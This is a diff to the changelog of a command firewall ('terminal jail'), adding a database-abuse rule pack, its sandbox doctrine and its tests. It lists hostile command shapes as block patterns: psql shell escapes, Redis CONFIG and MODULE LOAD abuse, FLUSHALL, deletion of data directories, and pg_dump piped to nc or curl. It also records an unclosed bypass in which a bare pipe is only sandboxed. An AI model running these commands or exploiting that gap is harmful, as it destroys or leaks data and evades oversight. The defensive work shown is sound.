@@ -9,6 +9,60 @@
   through the jail was never ruled on — it failed only because the user
   namespace broke setuid. Bridge callers are warned not to read an ALLOW as
   "the firewall ruled on my script's contents."
+### The optional 'db' pack carries the FULL database-abuse catalogue (TJ-GAP-062)
+
+- **Feature** (`plugin/terminal_jail/rules/packs/db.yaml`, 3 → 14 rules): the
+  mechanism-proof pack from TJ-GAP-061/DF-23 deferred the researched catalogue
+  ("the wider catalogue … is deliberately NOT in this file"); that deferral note
+  is gone and the catalogue is landed. New BLOCK rules (priority 950):
+  `pack-db-psql-meta-shell` (psql `\!` — arbitrary shell through the DB client,
+  matched only where the escape OPENS a `-c`/`-e`/`--command`/`--execute`
+  argument so a legitimate `-c "… \!= …"` SQL argument is untouched),
+  `pack-db-truncate-cascade` (`TRUNCATE ... CASCADE` — the FK closure),
+  `pack-db-admin-shutdown` (`mysqladmin`/`mariadb-admin shutdown`),
+  `pack-db-redis-config` (`CONFIG SET dir|dbfilename`, `CONFIG REWRITE`),
+  `pack-db-redis-module` (`MODULE LOAD|UNLOAD` — the redis RCE pattern),
+  `pack-db-redis-flush` (`FLUSHALL`/`FLUSHDB`), `pack-db-mongosh-drop`,
+  `pack-db-mongosh-shutdown`, `pack-db-data-dir-delete` (delete of a live
+  `/var/lib/{postgresql,mysql,mariadb,mongodb,redis}` tree or a `*.duckdb` file)
+  and `pack-db-dump-exfil` (`pg_dump`/`mysqldump` piped to `nc`/`curl`-upload/
+  `wget --post-file`). New SANDBOX rules (priority 650): `pack-db-truncate`
+  (a bare TRUNCATE) and `pack-db-drop-table`.
+- **Gray-zone doctrine**: a single-table `DROP TABLE` and a bare `TRUNCATE` are
+  destructive-but-scoped, so they are now auto-sandboxed (the namespace wrap —
+  the command still runs) instead of blocked. This is a deliberate VERDICT
+  change from DF-23, which blocked `DROP TABLE`; blocks are reserved for the
+  whole-store shapes. The DF-23 false-positive fix — execution-context matching
+  — is preserved unchanged, and extended: every client-token rule is anchored at
+  COMMAND POSITION (start of string or a shell operator), so prose that merely
+  names a tool (`git commit -am "note the redis-cli FLUSHALL incident"`) and a
+  quoted SQL data literal are not matched.
+- **Mechanism note, measured**: a pack rule carries a new id, so it lives in
+  Layer 4 and is evaluated PER SEGMENT — it never sees a shell operator. The
+  exfil rule is therefore keyed on the form the WRAPPER produces
+  (`standalone/terminal-jail` single-quotes every argv token, so
+  `pg_dump db | nc h p` reaches the engine as one segment whose quote-stripped
+  candidate is the bare pipe form; that path BLOCKS), and the documented
+  `pipeline` match type is recorded as unreachable (`parse_command` only ever
+  emits `SegmentType.SIMPLE`). **Residual, pinned by a test rather than
+  implied:** through the Python API with a BARE pipe the parser splits the
+  command at the operator, so the same vector is `modify`
+  (`pack-db-dump-restore`) — sandboxed, still running — rather than `block`.
+  Closing it needs an engine change (the decider's whole-command pass covers
+  builtin block rules only), so it is reported, not worked around.
+  A builtin block rule claims overlapping vectors earlier in the whole-command
+  pass, so `pg_dump db | curl -T - …` is still reported as
+  `builtin-net-curl-upload`; the pack's curl arm is the backstop for a host that
+  has overridden that builtin to `warn`.
+- **Tests** (`plugin/test_rule_pack_db.py`, new, 107 cases): every new rule id
+  fired through `intercept()` with the pack installed under the installer's own
+  file name; every false-positive context above asserted un-attributed (with a
+  no-pack control); every legit pin (`psql -c 'SELECT …'`, `psql -f`,
+  `sqlite3 … 'INSERT …'`, alembic/ORM, `pg_dump` to a local file,
+  `redis-cli GET/SET`, `mysqladmin status`) asserted to keep its verdict; every
+  gray shape asserted `modify` with a `unshare` payload. Structural pins cover
+  the id set, the 950/650 priorities, the absence of the deferral note, and the
+  two-condition composite shape.
 
 ### Scoped-secret-source egress shapes pinned in the regression suite (DF-TERMINAL-JAIL-31)
 
